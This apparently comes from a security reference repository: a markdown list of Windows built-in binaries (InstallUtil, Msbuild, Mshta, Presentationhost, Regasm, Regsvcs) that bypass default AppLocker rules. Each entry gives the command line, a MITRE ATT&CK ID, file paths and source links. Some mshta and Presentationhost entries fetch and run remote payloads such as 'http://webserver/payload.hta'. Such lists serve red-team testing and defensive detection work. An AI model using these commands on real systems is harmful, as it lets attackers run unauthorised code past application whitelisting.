# Confirmed AppLocker ByPasses for Instances Running a Default Configuration and/or Rules.

Below is a detailed list of the verified trusted executables that can circumvent AppLocker protections if setup with the default rules/configuration.

## Installutil.exe

```
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
Execute the target .NET DLL or EXE using the uninstall method.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1118](https://attack.mitre.org/wiki/Technique/T1118)   
   
* Links:   
  * https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
  * https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  * https://www.rapid7.com/db/modules/exploit/windows/local/applocker_bypass
   
* File path:   
  * C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
  * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/

## Msbuild.exe

```
msbuild.exe pshell.xml
Build and execute a C# project stored in the target XML file.

msbuild.exe Msbuild.csproj
Build and execute a C# project stored in the target CSPROJ file.
```

* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1127](https://attack.mitre.org/wiki/Technique/T1127)   
   
* Links:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md
  * https://github.com/Cn33liz/MSBuildShell
  * https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
   
* File path:   
  * C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe
  * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe
  * C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe
  * C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe
  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe
  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/
  * Name: Cn33liz
    * Twitter: [@Cneelis](https://twitter.com/@Cneelis)
    * Blog: http://cn33liz.blogspot.com/

## Mshta.exe 

```
mshta.exe C:\poc\evilfile.hta
Executes code inside evilfile.hta.

mshta.exe javascript:a=GetObject("script:https://gist.github.com/someone/something.sct").Exec();close();
Executes remote SCT file

mshta.exe http://webserver/payload.hta
Executes hta file from external webserver
```

* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1170](https://attack.mitre.org/wiki/Technique/T1170)   
   
* Links:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md
  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
  * https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
   
* File path:   
  * C:\Windows\System32\mshta.exe
  * C:\Windows\SysWOW64\mshta.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/

## Presentationhost.exe

```
Presentationhost.exe file:///IPAddressOrDomainName/Evil.xbap
Executes the target XAML Browser Application (XBAP) file.
```

* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1218](https://attack.mitre.org/techniques/T1218/)   
   
* Links:   
  * https://medium.com/@jpg.inc.au/applocker-bypass-presentationhost-exe-8c87b2354cd4
  * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
   
* File path:   
  * c:\windows\system32\PresentationHost.exe
  * c:\windows\sysWOW64\PresentationHost.exe
   
* Acknowledgement:   
  * Name: Josh Graham of TSS
    * Twitter: [@JPG1nc](https://twitter.com/@JPG1nc)
    * Blog: https://medium.com/@jpg.inc.au
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/

## Regasm.exe

```
regasm.exe /U AllTheThingsx64.dll
Loads the target .DLL file and executes the UnRegisterClass function.

regasm.exe AllTheThingsx64.dll
Loads the target .DLL file and executes the RegisterClass function.
```

* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1121](https://attack.mitre.org/wiki/Technique/T1121)   
   
* Links:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1121/T1121.md#atomic-test-1---regasm-uninstall-method-call-test
  * https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
   
* File path:   
  * C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe
  * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe
  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/

## Regsvcs.exe

```
regsvcs.exe /U regsvcs.dll
Loads the target .DLL file and executes the UnRegisterClass function.

regsvcs.exe regsvcs.dll
Loads the target .DLL file and executes the RegisterClass function.
```

* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1121](https://attack.mitre.org/wiki/Technique/T1121)   
   
* Links:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1121/T1121.md#atomic-test-2---regsvs-uninstall-method-call-test
  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
   
* File path:   
  * C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe
  * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe
  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/
